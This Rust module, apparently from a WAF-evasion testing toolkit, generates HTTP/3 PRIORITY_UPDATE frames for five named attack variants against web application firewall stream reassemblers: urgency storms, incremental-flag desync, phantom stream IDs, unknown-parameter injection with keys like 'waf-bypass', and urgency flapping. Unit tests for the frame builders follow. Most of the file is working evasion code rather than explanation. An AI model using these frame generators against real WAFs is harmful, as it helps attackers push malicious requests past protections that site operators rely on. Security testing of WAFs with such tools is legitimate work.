//! HTTP/3 stream priority topology attacks (RFC 9218).
//!
//! ## Background
//!
//! HTTP/3 stream prioritization uses the "Extensible Priorities" scheme
//! (RFC 9218) — a `Priority` request header and `PRIORITY_UPDATE` frames
//! (type 0xF0700 for request streams, 0xF0701 for push streams).
//!
//! `PRIORITY_UPDATE` frame format:
//! ```text
//! Type: 0xF0700 (varint)
//! Length: varint
//! Prioritized Element ID: varint (stream ID)
//! Priority Field Value: ASCII string ("u=N,i" format)
//! ```
//!
//! The `Priority Field Value` is an SF-Dictionary (RFC 8941):
//! - `u`: urgency (0-7, default 3; 0 = highest)
//! - `i`: incremental flag (boolean; true = stream multiplexed round-robin)
//!
//! ## Attack surface
//!
//! WAF HTTP/3 multiplexing reassemblers use priority information to
//! interleave streams. Pathological priority topologies can:
//!
//! 1. **Urgency storm**: Set all request streams to urgency 0 (maximum);
//!    WAF's scheduler may serialize them instead of interleaving, causing
//!    per-stream context to bleed
//! 2. **Incremental flag desync**: Mix `i=?1` (incremental, round-robin)
//!    and `i=?0` (exclusive, deliver completely) in confusing orders that
//!    cause the WAF's request queue to reassemble a different HTTP/3 stream
//!    body than the server delivers
//! 3. **Non-existent stream priority**: Send `PRIORITY_UPDATE` for stream
//!    IDs that don't exist yet — some WAF implementations crash or reset
//!    their priority state
//! 4. **Unknown parameters**: Include unknown SF-Dictionary members that
//!    a strict WAF parser rejects but a lenient server parser ignores

use crate::{EvasionFrame, EvasionFrameSet, EvasionTechnique};

/// HTTP/3 PRIORITY_UPDATE frame (RFC 9218 §7.2).
#[derive(Debug, Clone)]
pub struct PriorityUpdateFrame {
    /// Stream ID this priority update applies to.
    pub stream_id: u64,
    /// Urgency value 0-7 (0 = highest priority).
    pub urgency: u8,
    /// Incremental flag (true = round-robin interleaving).
    pub incremental: bool,
    /// Extra SF-Dictionary members to inject (for unknown-param attacks).
    pub extra_params: Vec<(String, String)>,
}

impl PriorityUpdateFrame {
    pub fn new(stream_id: u64, urgency: u8, incremental: bool) -> Self {
        Self {
            stream_id,
            urgency: urgency.min(7),
            incremental,
            extra_params: Vec::new(),
        }
    }

    pub fn with_extra_param(mut self, key: &str, value: &str) -> Self {
        self.extra_params.push((key.to_string(), value.to_string()));
        self
    }

    /// Serialize the `Priority Field Value` SF-Dictionary string.
    pub fn priority_field_value(&self) -> String {
        let mut parts = Vec::new();
        parts.push(format!("u={}", self.urgency));
        if self.incremental {
            parts.push("i".to_string()); // boolean true in SF-Dictionary
        }
        for (k, v) in &self.extra_params {
            if v.is_empty() {
                parts.push(k.clone()); // SF boolean
            } else {
                parts.push(format!("{}={}", k, v));
            }
        }
        parts.join(", ")
    }

    /// Encode as a QUIC/HTTP3 PRIORITY_UPDATE frame for a request stream
    /// (frame type = 0xF0700).
    ///
    /// This is a control-stream frame sent on the HTTP/3 control stream.
    pub fn to_bytes(&self) -> Vec<u8> {
        use crate::quic_cid::quic_varint;
        let field_value = self.priority_field_value();
        let field_bytes = field_value.as_bytes();
        // Payload = stream_id (varint) + priority field value (bytes)
        let stream_id_enc = quic_varint(self.stream_id);
        let payload_len = stream_id_enc.len() + field_bytes.len();
        let mut buf = Vec::new();
        // Frame type: 0xF0700 as QUIC varint (4 bytes, 0x80 prefix + 3 bytes)
        // 0xF0700 = 0x000F_0700; 4-byte varint range is up to 0x3FFF_FFFF,
        // so 0xF0700 = 986880 which is < 2^30 → use 4-byte encoding.
        let frame_type: u64 = 0xF0700;
        buf.extend_from_slice(&quic_varint(frame_type));
        // Frame length
        buf.extend_from_slice(&quic_varint(payload_len as u64));
        // Payload: Prioritized Element ID
        buf.extend_from_slice(&stream_id_enc);
        // Payload: Priority Field Value
        buf.extend_from_slice(field_bytes);
        buf
    }
}

/// An HTTP/3 stream priority topology attack.
#[derive(Debug, Clone)]
pub struct H3PriorityAttack {
    pub variant: H3PriorityVariant,
    pub frames: Vec<PriorityUpdateFrame>,
    pub description: String,
}

/// Variant of the HTTP/3 priority topology attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum H3PriorityVariant {
    /// All request streams set to urgency 0 simultaneously.
    UrgencyStorm,
    /// Mix of incremental/exclusive flags in confusing alternating pattern.
    IncrementalDesync,
    /// PRIORITY_UPDATE for non-existent (future) stream IDs.
    PhantomStreamPriority,
    /// Unknown SF-Dictionary parameters to confuse strict WAF parsers.
    UnknownParamInjection,
    /// Rapidly alternating urgency levels for the same stream.
    UrgencyFlapping,
}

impl H3PriorityAttack {
    /// Build an urgency storm: n_streams streams all at urgency 0.
    pub fn urgency_storm(n_streams: usize) -> Self {
        let frames: Vec<PriorityUpdateFrame> = (0..n_streams)
            .map(|i| PriorityUpdateFrame::new((i as u64) * 4, 0, false))
            .collect();
        Self {
            variant: H3PriorityVariant::UrgencyStorm,
            frames,
            description: format!(
                "H3 urgency storm: {} streams all at urgency=0 (max priority)",
                n_streams
            ),
        }
    }

    /// Build an incremental desync: alternating i=?1 and i=?0 for the same stream.
    pub fn incremental_desync(stream_id: u64, n_updates: usize) -> Self {
        let frames: Vec<PriorityUpdateFrame> = (0..n_updates)
            .map(|i| PriorityUpdateFrame::new(stream_id, 3, i % 2 == 0))
            .collect();
        Self {
            variant: H3PriorityVariant::IncrementalDesync,
            frames,
            description: format!(
                "H3 incremental desync: {} alternating i=?1/i=?0 for stream {}",
                n_updates, stream_id
            ),
        }
    }

    /// Build phantom stream priority: PRIORITY_UPDATE for non-existent stream IDs.
    ///
    /// `base_stream_id` is the next expected stream ID; we update
    /// IDs well beyond it (future streams that haven't been opened yet).
    pub fn phantom_stream_priority(base_stream_id: u64, n_phantom: usize) -> Self {
        let frames: Vec<PriorityUpdateFrame> = (0..n_phantom)
            .map(|i| {
                let fake_id = base_stream_id + (i as u64 + 1) * 1000 * 4;
                PriorityUpdateFrame::new(fake_id, 3, false)
            })
            .collect();
        Self {
            variant: H3PriorityVariant::PhantomStreamPriority,
            frames,
            description: format!(
                "H3 phantom stream priority: {} PRIORITY_UPDATE for non-existent streams",
                n_phantom
            ),
        }
    }

    /// Build an unknown-parameter injection attack.
    ///
    /// Injects SF-Dictionary members unknown to RFC 9218. A strict WAF
    /// parser that rejects unknown members will block the frame; a lenient
    /// server parser ignores them. The attack header in the request passes
    /// the lenient server path while the WAF rejects the entire request
    /// (allowing the attack to reach the server un-blocked on retry with
    /// slightly different params).
    pub fn unknown_param_injection(stream_id: u64) -> Self {
        let frame = PriorityUpdateFrame::new(stream_id, 3, false)
            .with_extra_param("waf-bypass", "1")
            .with_extra_param("x-secret", "?1")
            .with_extra_param("zzz", "");
        Self {
            variant: H3PriorityVariant::UnknownParamInjection,
            frames: vec![frame],
            description: format!(
                "H3 unknown-param injection on stream {}: unknown SF-Dict members",
                stream_id
            ),
        }
    }

    /// Build an urgency-flapping attack: rapidly flip urgency 0↔7 for a stream.
    pub fn urgency_flapping(stream_id: u64, n_flaps: usize) -> Self {
        let frames: Vec<PriorityUpdateFrame> = (0..n_flaps)
            .map(|i| PriorityUpdateFrame::new(stream_id, if i % 2 == 0 { 0 } else { 7 }, false))
            .collect();
        Self {
            variant: H3PriorityVariant::UrgencyFlapping,
            frames,
            description: format!(
                "H3 urgency flapping: {} flips 0↔7 for stream {}",
                n_flaps, stream_id
            ),
        }
    }

    /// Convert to an `EvasionFrameSet`.
    ///
    /// All PRIORITY_UPDATE frames are sent on the HTTP/3 control stream
    /// (stream ID 2, but this is encoded as `stream_id=2` in the metadata).
    pub fn to_frame_set(&self) -> EvasionFrameSet {
        let frames: Vec<EvasionFrame> = self
            .frames
            .iter()
            .map(|pf| EvasionFrame {
                bytes: pf.to_bytes(),
                description: format!(
                    "PRIORITY_UPDATE stream={} u={} i={} {}",
                    pf.stream_id,
                    pf.urgency,
                    pf.incremental,
                    if pf.extra_params.is_empty() {
                        "".to_string()
                    } else {
                        format!("extra_params={}", pf.extra_params.len())
                    }
                ),
                technique: EvasionTechnique::StreamPriorityTopology,
                stream_id: 2, // control stream
            })
            .collect();
        EvasionFrameSet {
            frames,
            technique: EvasionTechnique::StreamPriorityTopology,
            description: self.description.clone(),
        }
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── PriorityUpdateFrame wire format ───────────────────────────────────

    #[test]
    fn priority_field_value_basic() {
        let frame = PriorityUpdateFrame::new(4, 3, false);
        assert_eq!(frame.priority_field_value(), "u=3");
    }

    #[test]
    fn priority_field_value_incremental() {
        let frame = PriorityUpdateFrame::new(4, 0, true);
        assert_eq!(frame.priority_field_value(), "u=0, i");
    }

    #[test]
    fn priority_field_value_extra_params() {
        let frame = PriorityUpdateFrame::new(0, 1, false).with_extra_param("x-bypass", "1");
        let val = frame.priority_field_value();
        assert!(val.contains("u=1"));
        assert!(val.contains("x-bypass=1"));
    }

    #[test]
    fn priority_urgency_clamped_to_7() {
        let frame = PriorityUpdateFrame::new(0, 255, false);
        assert_eq!(frame.urgency, 7, "urgency must be clamped to 7");
    }

    #[test]
    fn priority_update_frame_bytes_not_empty() {
        let frame = PriorityUpdateFrame::new(4, 3, false);
        let bytes = frame.to_bytes();
        assert!(!bytes.is_empty());
    }

    #[test]
    fn priority_update_frame_contains_urgency_in_field_value() {
        let frame = PriorityUpdateFrame::new(4, 5, false);
        let bytes = frame.to_bytes();
        // "u=5" must appear in the bytes
        let as_str = String::from_utf8_lossy(&bytes);
        assert!(
            as_str.contains("u=5"),
            "frame bytes must contain urgency value"
        );
    }

    #[test]
    fn priority_update_frame_contains_incremental_flag() {
        let frame = PriorityUpdateFrame::new(4, 3, true);
        let bytes = frame.to_bytes();
        let as_str = String::from_utf8_lossy(&bytes);
        assert!(
            as_str.contains(", i") || as_str.contains("i"),
            "incremental flag must appear"
        );
    }

    // ── Urgency storm ─────────────────────────────────────────────────────

    #[test]
    fn urgency_storm_frame_count() {
        let attack = H3PriorityAttack::urgency_storm(8);
        assert_eq!(attack.frames.len(), 8);
    }

    #[test]
    fn urgency_storm_all_at_urgency_0() {
        let attack = H3PriorityAttack::urgency_storm(5);
        for frame in &attack.frames {
            assert_eq!(frame.urgency, 0, "all frames must be urgency=0");
        }
    }

    #[test]
    fn urgency_storm_stream_ids_are_unique() {
        let attack = H3PriorityAttack::urgency_storm(4);
        let ids: Vec<u64> = attack.frames.iter().map(|f| f.stream_id).collect();
        let unique: std::collections::HashSet<_> = ids.iter().collect();
        assert_eq!(unique.len(), ids.len(), "each stream must have a unique ID");
    }

    // ── Incremental desync ────────────────────────────────────────────────

    #[test]
    fn incremental_desync_alternates_flag() {
        let attack = H3PriorityAttack::incremental_desync(4, 6);
        for (i, frame) in attack.frames.iter().enumerate() {
            assert_eq!(
                frame.incremental,
                i % 2 == 0,
                "incremental must alternate even/odd"
            );
        }
    }

    #[test]
    fn incremental_desync_all_same_stream() {
        let attack = H3PriorityAttack::incremental_desync(12, 4);
        for frame in &attack.frames {
            assert_eq!(frame.stream_id, 12);
        }
    }

    // ── Phantom stream priority ───────────────────────────────────────────

    #[test]
    fn phantom_stream_ids_are_far_ahead() {
        let attack = H3PriorityAttack::phantom_stream_priority(4, 3);
        for frame in &attack.frames {
            assert!(
                frame.stream_id > 1000,
                "phantom streams must be far beyond current"
            );
        }
    }

    #[test]
    fn phantom_stream_ids_are_unique() {
        let attack = H3PriorityAttack::phantom_stream_priority(0, 5);
        let ids: Vec<u64> = attack.frames.iter().map(|f| f.stream_id).collect();
        let unique: std::collections::HashSet<_> = ids.iter().collect();
        assert_eq!(unique.len(), ids.len());
    }

    // ── Unknown param injection ───────────────────────────────────────────

    #[test]
    fn unknown_param_has_extra_members() {
        let attack = H3PriorityAttack::unknown_param_injection(8);
        let frame = &attack.frames[0];
        assert!(
            !frame.extra_params.is_empty(),
            "unknown-param attack must have extra params"
        );
    }

    #[test]
    fn unknown_param_field_value_contains_unknown_keys() {
        let attack = H3PriorityAttack::unknown_param_injection(0);
        let fv = attack.frames[0].priority_field_value();
        assert!(
            fv.contains("waf-bypass") || fv.contains("x-secret"),
            "field value must contain injected unknown keys"
        );
    }

    // ── Urgency flapping ──────────────────────────────────────────────────

    #[test]
    fn urgency_flapping_alternates_0_and_7() {
        let attack = H3PriorityAttack::urgency_flapping(4, 6);
        for (i, frame) in attack.frames.iter().enumerate() {
            let expected = if i % 2 == 0 { 0 } else { 7 };
            assert_eq!(
                frame.urgency, expected,
                "urgency must alternate 0/7 at index {}",
                i
            );
        }
    }

    // ── to_frame_set ──────────────────────────────────────────────────────

    #[test]
    fn to_frame_set_technique_is_stream_priority() {
        let attack = H3PriorityAttack::urgency_storm(3);
        let fs = attack.to_frame_set();
        assert_eq!(fs.technique, EvasionTechnique::StreamPriorityTopology);
    }

    #[test]
    fn to_frame_set_frames_on_control_stream() {
        let attack = H3PriorityAttack::urgency_storm(2);
        let fs = attack.to_frame_set();
        for frame in &fs.frames {
            assert_eq!(
                frame.stream_id, 2,
                "PRIORITY_UPDATE frames must be on control stream (2)"
            );
        }
    }

    #[test]
    fn to_frame_set_count_matches_attack() {
        let attack = H3PriorityAttack::urgency_flapping(0, 7);
        let fs = attack.to_frame_set();
        assert_eq!(fs.frames.len(), 7);
    }
}
